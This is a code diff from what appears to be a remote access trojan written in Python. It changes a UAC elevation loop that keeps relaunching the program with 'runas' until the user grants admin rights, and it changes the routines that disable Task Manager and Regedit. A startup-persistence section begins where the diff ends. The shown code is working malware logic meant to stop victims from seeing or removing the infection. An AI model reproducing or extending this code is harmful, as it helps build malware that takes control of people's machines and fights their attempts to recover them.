@@ -152,51 +152,53 @@ for Directories in RAT:
 
 if AdminRightsRequired is True:
 
-	if Expansion == '.py':
-		print('[-] › Running with admin rights is not supported for extension .py\n')
-	else:
-		if Admin() is False:
-			while True:
-				try:
-					print('[~] › Trying elevate previleges to administrator\n')
-					os.startfile(CurrentPath, 'runas')
-				except:
-					pass
-				else:
-					print('[+] › ' + CurrentName + ' opened as admin rights\n')
-					sys.exit()
+	if Admin() is False:
+		while True:
+			try:
+				print('[~] › Trying elevate previleges to administrator\n')
+				os.startfile(CurrentPath, 'runas')
+			except:
+				pass
+			else:
+				print('[+] › ' + CurrentName + ' opened as admin rights\n')
+				break
+
+
+# Checks if the file is running as an administrator
+
+if AdminRightsRequired is True:
+	if Admin() is False:
+		sys.exit()
 
 
 # Disables TaskManager
 
 if DisableTaskManager is True:
 
-	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
-		print('[+] › taskmgr.exe is already disabled\n')
-	else:
-		if Admin() is False:
-			print('[-] › This function requires admin rights\n')
+	if Admin() is False:
+		print('[-] › This function requires admin rights\n')
 
-		if Admin() is True:
+	if Admin() is True:
+		try:
 			RegeditDisableTaskManager()
-			open(Directory + 'RegeditDisableTaskManager', 'a').close()
 			print('[+] › taskmgr.exe has been disabled\n')
+		except:
+			print('[+] › taskmgr.exe is already disabled\n')
 
 
 # Disables Regedit
 
 if DisableRegistryTools is True:
 
-	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
-		print('[+] › regedit.exe is already disabled\n')
-	else:
-		if Admin() is False:
-			print('[-] › This function requires admin rights\n')
+	if Admin() is False:
+		print('[-] › This function requires admin rights\n')
 
-		if Admin() is True:
+	if Admin() is True:
+		try:
 			RegeditDisableRegistryTools()
-			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
 			print('[+] › regedit.exe has been disabled\n')
+		except:
+			print('[+] › regedit.exe is already disabled\n')
 
 
 # Adds a program to startup
